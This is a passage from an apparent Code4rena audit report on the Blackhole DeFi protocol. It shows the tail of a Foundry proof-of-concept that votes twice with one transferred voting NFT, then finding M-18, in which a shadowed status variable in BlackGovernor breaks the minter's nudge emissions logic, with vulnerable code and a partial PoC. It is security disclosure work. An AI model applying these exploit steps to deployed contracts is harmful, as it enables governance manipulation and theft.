<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1"> = </span><span class="mtk4">new</span><span class="mtk1"> </span><span class="mtk10">bytes</span><span class="mtk1">[](</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">targets</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk11">address</span><span class="mtk1">(</span><span class="mtk12">minterUpgradeable</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">values</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk7">0</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">calldatas</span><span class="mtk1">[</span><span class="mtk7">0</span><span class="mtk1">] = </span><span class="mtk12">abi</span><span class="mtk1">.</span><span class="mtk11">encodeWithSelector</span><span class="mtk1">(</span><span class="mtk12">IMinter</span><span class="mtk1">.</span><span class="mtk12">nudge</span><span class="mtk1">.</span><span class="mtk12">selector</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">uint</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">propose</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk8">"Nudge proposal"</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        );</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk11">skip</span><span class="mtk1">(</span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">votingDelay</span><span class="mtk1">() +</span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">castVote</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">againstVotes</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">forVotes</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">abstainVotes</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        )= </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">proposalVotes</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"Against Votes: "</span><span class="mtk1">, </span><span class="mtk12">againstVotes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"For Votes: "</span><span class="mtk1">, </span><span class="mtk12">forVotes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"Abstain Votes: "</span><span class="mtk1">, </span><span class="mtk12">abstainVotes</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">votingEscrow</span><span class="mtk1">.</span><span class="mtk11">transferFrom</span><span class="mtk1">(</span><span class="mtk12">userA</span><span class="mtk1">, </span><span class="mtk12">userB</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">stopPrank</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">vm</span><span class="mtk1">.</span><span class="mtk11">startPrank</span><span class="mtk1">(</span><span class="mtk12">userB</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">castVote</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">, </span><span class="mtk7">1</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">         (</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">againstVotes2</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">forVotes2</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">            </span><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">abstainVotes2</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        )= </span><span class="mtk12">blackGovernor</span><span class="mtk1">.</span><span class="mtk11">proposalVotes</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"Against Votes: "</span><span class="mtk1">, </span><span class="mtk12">againstVotes2</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"For Votes: "</span><span class="mtk1">, </span><span class="mtk12">forVotes2</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">        </span><span class="mtk10">console</span><span class="mtk1">.</span><span class="mtk11">log</span><span class="mtk1">(</span><span class="mtk8">"Abstain Votes: "</span><span class="mtk1">, </span><span class="mtk12">abstainVotes2</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    }</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<p><strong><a href="https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues">Blackhole mitigated</a></strong></p>
<p><strong>Status:</strong> Mitigation confirmed. Full details in reports from <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-56">rayss</a>, <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-3">lonelybones</a> and <a href="https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-66">maxvzuvex</a>.</p>
<hr>
<h2 style="position:relative;" id="m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality"><a class="anchor before" aria-label="m 18 status does not update inside the blackgovernor leading to complete distribution of nudge functionality permalink" href="#m-18-status-does-not-update-inside-the-blackgovernor-leading-to-complete-distribution-of-nudge-functionality"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-162">[M-18] Status does not update inside the <code>BlackGovernor</code> leading to complete distribution of nudge functionality</a></h2>
<p><em>Submitted by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-416">hakunamatata</a>, also found by <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-173">danzero</a>, <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-210">rashmor</a>, and <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/S-199">rmrf480</a></em></p>
<p><a href="https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L308-L330">https://github.com/code-423n4/2025-05-blackhole/blob/main/contracts/governance/Governor.sol#L308-L330</a></p>
<h3 style="position:relative;" id="finding-description-and-impact-6"><a class="anchor before" aria-label="finding description and impact 6 permalink" href="#finding-description-and-impact-6"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Finding description and impact</h3>
<p><code>MinterUpgradeable</code> has <code>nudge</code> function that is called by the <code>BlackGovernor</code> contract. The nudge function then check the <code>status</code> of the <code>BlackGovernor</code> and based on status, updates the <code>tailEmissionRate</code> of the contract; however, from analyzing the <code>BlackGovernor</code> contract (which means also analyzing contracts inside the <code>Governor.sol</code> ), we can see that the <code>status</code> variable <strong>DOES NOT CHANGE EVER</strong>. This leads to the fact that even though proposal has succeeded meaning the <code>tailEmissionRate</code> should be equal to <code>PROPOSAL_INCREASE</code>, it goes to else branch and <code>tailEmissionRate</code> never changes. </p>
<p>This is because the status variable inside <code>BlackGovernor/Governor</code> is SHADOWED in the <code>execute</code> function, which can be easily checked using even Solidity Visual Developer extension.</p>
<pre data-index="69" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1">  </span><span class="mtk11">nudge</span><span class="mtk1">() </span><span class="mtk11">external</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1"> </span><span class="mtk12">_epochGovernor</span><span class="mtk1"> = </span><span class="mtk12">_gaugeManager</span><span class="mtk1">.</span><span class="mtk11">getBlackGovernor</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">msg</span><span class="mtk1">.</span><span class="mtk12">sender</span><span class="mtk1"> == </span><span class="mtk12">_epochGovernor</span><span class="mtk1">, </span><span class="mtk8">"NA"</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">//@audit STATUS NEVER GETS UPDATED !!!</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">IBlackGovernor</span><span class="mtk1">.</span><span class="mtk12">ProposalState</span><span class="mtk1"> </span><span class="mtk12">_state</span><span class="mtk1"> = </span><span class="mtk11">IBlackGovernor</span><span class="mtk1">(</span><span class="mtk12">_epochGovernor</span><span class="mtk1">)</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">.</span><span class="mtk11">status</span><span class="mtk1">();</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">require</span><span class="mtk1">(</span><span class="mtk12">weekly</span><span class="mtk1"> &lt; </span><span class="mtk12">TAIL_START</span><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">_period</span><span class="mtk1"> = </span><span class="mtk12">active_period</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk11">require</span><span class="mtk1">(!</span><span class="mtk12">proposals</span><span class="mtk1">[</span><span class="mtk12">_period</span><span class="mtk1">]);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_state</span><span class="mtk1"> == </span><span class="mtk12">IBlackGovernor</span><span class="mtk1">.</span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Succeeded</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">tailEmissionRate</span><span class="mtk1"> = </span><span class="mtk12">PROPOSAL_INCREASE</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1">  </span><span class="mtk15">if</span><span class="mtk1"> (</span><span class="mtk12">_state</span><span class="mtk1"> == </span><span class="mtk12">IBlackGovernor</span><span class="mtk1">.</span><span class="mtk12">ProposalState</span><span class="mtk1">.</span><span class="mtk12">Defeated</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">tailEmissionRate</span><span class="mtk1"> = </span><span class="mtk12">PROPOSAL_DECREASE</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">} </span><span class="mtk15">else</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">tailEmissionRate</span><span class="mtk1"> = </span><span class="mtk7">10000</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">proposals</span><span class="mtk1">[</span><span class="mtk12">_period</span><span class="mtk1">] = </span><span class="mtk4">true</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">}</span></span></span></code></pre>
<pre data-index="70" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk4">function</span><span class="mtk1">  </span><span class="mtk11">execute</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">address</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes</span><span class="mtk1">[] </span><span class="mtk12">memory</span><span class="mtk1"> </span><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">bytes32</span><span class="mtk1"> </span><span class="mtk12">epochTimeHash</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">) </span><span class="mtk11">public</span><span class="mtk1">  </span><span class="mtk11">payable</span><span class="mtk1"> </span><span class="mtk11">virtual</span><span class="mtk1"> </span><span class="mtk11">override</span><span class="mtk1"> </span><span class="mtk11">returns</span><span class="mtk1"> (</span><span class="mtk12">uint256</span><span class="mtk1">) {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">uint256</span><span class="mtk1"> </span><span class="mtk12">proposalId</span><span class="mtk1"> = </span><span class="mtk11">hashProposal</span><span class="mtk1">(</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">targets</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">values</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">calldatas</span><span class="mtk1">,</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">epochTimeHash</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">);</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk3">//@audit variable is shadowed</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">ProposalState</span><span class="mtk1"> </span><span class="mtk12">status</span><span class="mtk1"> = </span><span class="mtk11">state</span><span class="mtk1">(</span><span class="mtk12">proposalId</span><span class="mtk1">);</span></span></span></code></pre>
<p>This vulnerability should be High severity, as the core functionality of the protocol is not working. The status is never updated leading to <code>tailEmissionRate</code> always being the same.</p>
<h3 style="position:relative;" id="recommended-mitigation-steps-19"><a class="anchor before" aria-label="recommended mitigation steps 19 permalink" href="#recommended-mitigation-steps-19"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Recommended mitigation steps</h3>
<p>Get rid of the shadowing and update the status variable.</p>
<h3 style="position:relative;" id="proof-of-concept-13"><a class="anchor before" aria-label="proof of concept 13 permalink" href="#proof-of-concept-13"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Proof of Concept</h3>
<p>This POC is written in foundry, in order to run it, one has to create foundry project, download dependencies, create remappings and change imports in some of the file to look inside the “src” folder.</p>
<p>The POC is the simple version of the finding, in order to run it one has to first change the code of the Governor, so that other vulnerability in the code is fixed, as without that change proposals DO NOT WORK. Look at the <a href="https://code4rena.com/audits/2025-05-blackhole/submissions/F-163"><code>getVotes</code> inside the <code>BlackGovernor</code> incorrectly provides <code>block.number</code> instead of <code>block.timestamp</code>, leading to complete DOS of proposal functionality</a> finding.</p>
<p>Also to see what’s happening one might add <code>console.logs</code> to minter upgradeable and Governor contract that is used inside <code>BlackGovernor</code>. We can see that even though the state of the proposal should be <code>X</code>, the status variable is always default value.</p>
<pre data-index="71" data-language="solidity" class="grvsc-container dark-default-dark"><code class="grvsc-code"><span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">pragma</span><span class="mtk1"> </span><span class="mtk12">solidity</span><span class="mtk1"> ^</span><span class="mtk7">0.8</span><span class="mtk1">.</span><span class="mtk7">13</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Test</span><span class="mtk1">, </span><span class="mtk12">console</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"forge-std/Test.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">Black</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/Black.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">MinterUpgradeable</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/MinterUpgradeable.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">RewardsDistributor</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/RewardsDistributor.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PermissionsRegistry</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/PermissionsRegistry.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">TokenHandler</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/TokenHandler.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">VoterV3</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/VoterV3.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">VotingEscrow</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/VotingEscrow.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">AutoVotingEscrowManager</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/AVM/AutoVotingEscrowManager.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeManager</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/GaugeManager.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PairGenerator</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/PairGenerator.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeFactory</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/factories/GaugeFactory.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">PairFactory</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/factories/PairFactory.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">GaugeFactoryCL</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/AlgebraCLVe33/GaugeFactoryCL.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">BlackGovernor</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/BlackGovernor.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IBlackHoleVotes</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/interfaces/IBlackHoleVotes.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">IMinter</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/interfaces/IMinter.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk15">import</span><span class="mtk1"> {</span><span class="mtk12">BlackTimeLibrary</span><span class="mtk1">} </span><span class="mtk15">from</span><span class="mtk1"> </span><span class="mtk8">"../src/libraries/BlackTimeLibrary.sol"</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk12">contract</span><span class="mtk1"> </span><span class="mtk12">GovernanceStatusNotUpdatingTest</span><span class="mtk1"> </span><span class="mtk12">is</span><span class="mtk1"> </span><span class="mtk12">Test</span><span class="mtk1"> {</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">Black</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">black</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">RewardsDistributor</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">rewardsDistributor</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">MinterUpgradeable</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">minterUpgradeable</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">PermissionsRegistry</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">permissionsRegistry</span><span class="mtk1">;</span></span></span>
<span class="grvsc-line"><span class="grvsc-source"><span class="mtk1">    </span><span class="mtk12">TokenHandler</span><span class="mtk1"> </span><span class="mtk12">public</span><span class="mtk1"> </span><span class="mtk12">tokenHandler</span><span class="mtk1">;</span></span></span>
